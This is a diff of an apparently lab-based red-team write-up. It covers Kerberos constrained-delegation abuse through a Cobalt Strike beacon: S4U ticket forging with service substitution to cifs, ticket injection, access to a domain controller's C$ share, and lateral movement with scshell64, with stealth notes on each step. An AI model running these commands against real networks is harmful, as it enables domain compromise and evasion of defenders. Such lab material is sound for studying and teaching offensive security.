@@ -138,16 +138,6 @@ doIGhDCCBoCgAwIBBaED <snip> hEjAQGwRjaWZzGwhsb24tZGMtMQ==
 
 > OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write on target.
 
-<img src="/images/kerberos-challenge05.png" width=860>
-
-> CS beacon showing full `krb_s4u` flow: S4U2self TGS for Administrator → S4U2proxy for `ldap/lon-dc-1` → service name substituted to `cifs` → base64 ticket output. Immediately followed by `make_token CONTOSO\Administrator FakePass` (netonly) and `kerberos_ticket_use` injecting the kirbi.
-
-**`/altservice:cifs`** Replaces the service class in the unencrypted EncTicketPart header. The KDC-signed encrypted PAC is unchanged. The target host validates only the encrypted portion and accepts the substituted ticket.
-
-Copy the full base64 output for SPN `cifs/lon-dc-1`.
-
----
-
 ## Step 5 — Save the service ticket to disk (attacker machine only)
 
 Run this in a **local PowerShell terminal on the attacker desktop** (not via beacon):
@@ -156,7 +146,14 @@ Run this in a **local PowerShell terminal on the attacker desktop** (not via bea
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("doIGhDCCBoCgAwIBBaEDAgEWooIFnDCC<snip>QGwRjaWZzGwhsb24tZGMtMQ=="))
 ```
 
-> The `.kirbi` file is written to the attacker desktop only — nothing is written to the target DC. `kerberos_ticket_use` reads the file from the CS client and injects it over the C2 channel.
+<img src="/images/kerberos-challenge05.png" width=860>
+
+> CS beacon showing full `krb_s4u` flow: S4U2self TGS for Administrator → S4U2proxy for `ldap/lon-dc-1` → service name substituted to `cifs` → base64 ticket output. Immediately followed by `make_token CONTOSO\Administrator FakePass` (netonly) and `kerberos_ticket_use` injecting the kirbi.
+
+**`/altservice:cifs`** Replaces the service class in the unencrypted EncTicketPart header. The KDC-signed encrypted PAC is unchanged. The target host validates only the encrypted portion and accepts the substituted ticket.
+
+Copy the full base64 output for SPN `cifs/lon-dc-1`.
+
 
 <img src="/images/kerberos-challenge04.png">
 
@@ -168,13 +165,15 @@ Run this in a **local PowerShell terminal on the attacker desktop** (not via bea
 
 Back in the beacon on `lon-wkstn-1`:
 
+>`.kirbi` file is written to the attacker desktop only — nothing is written to the target DC. `kerberos_ticket_use` reads the file from the CS client and injects it over the C2 channel.  
+
 ```cs
 make_token CONTOSO\Administrator FakePass
 kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
 ls \\lon-dc-1\c$
 ```
 
-File list Output:
+>File list Output:  
 
 ```
  Size     Type    Last Modified         Name
@@ -191,17 +190,17 @@ File list Output:
  1gb      fil     04/12/2026 14:05:24   pagefile.sys
 ```
 
-> OPSEC-🟢SAFE — `make_token` creates a sacrificial logon session in beacon memory. `kerberos_ticket_use` injects the ticket into that session — no disk write on target, no child process.
+> OPSEC-🟢SAFE — `make_token` creates a sacrificial logon session in beacon memory.  
+> `kerberos_ticket_use` injects the ticket into that session — no disk write on target, no child process.  
 
 ## Lateral Movement to DC
 
 ```
-jump winrm64 lon-dc-1 smb
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-dc-1 smb
 ```
 
-beacon jump output:
+>beacon jump output:  
 
 ```
 [04/28 10:08:05] [+] host called home, sent: 396130 bytes
@@ -231,7 +230,7 @@ getuid
 ipconfig
 ```
 
-ipconfig output
+>ipconfig output:  
 ```
 received output:
 {786FFF21-9572-488C-94B9-FD396C9802A4}
